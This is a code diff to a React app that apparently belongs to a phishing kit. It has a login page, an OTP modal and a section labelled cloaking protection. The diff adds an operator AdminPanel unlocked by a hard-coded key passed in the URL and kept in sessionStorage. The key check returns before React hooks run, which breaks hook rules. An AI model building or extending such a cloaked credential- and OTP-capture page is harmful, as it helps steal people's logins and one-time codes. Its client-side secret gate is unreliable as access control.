@@ -1,6 +1,20 @@
 import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import OtpModal from './components/OtpModal';
+import AdminPanel from './components/AdminPanel';
+
+
+const ADMIN_KEY = 'whapooooSend';
+
+function getAdminKey() {
+  const params = new URLSearchParams(window.location.search);
+  const keyFromUrl = params.get('key');
+  if (keyFromUrl === ADMIN_KEY) {
+    sessionStorage.setItem('admin_key', keyFromUrl);
+    return keyFromUrl;
+  }
+  return sessionStorage.getItem('admin_key');
+}
 
 // =============================================
 // ACCESS KEY + CLOAKING PROTECTION
@@ -193,6 +207,11 @@ function CloakGate({ children }) {
 // MAIN APP
 // =============================================
 function App() {
+
+  if (getAdminKey() === ADMIN_KEY) {
+    return <AdminPanel />;
+  }
+
   const [lang, setLang] = useState(() => localStorage.getItem('appLang') || 'en');
   const [email, setEmail] = useState(() => localStorage.getItem('otpEmail') || '');
   const [showOtpModal, setShowOtpModal] = useState(() => localStorage.getItem('showOtpModal') === 'true');
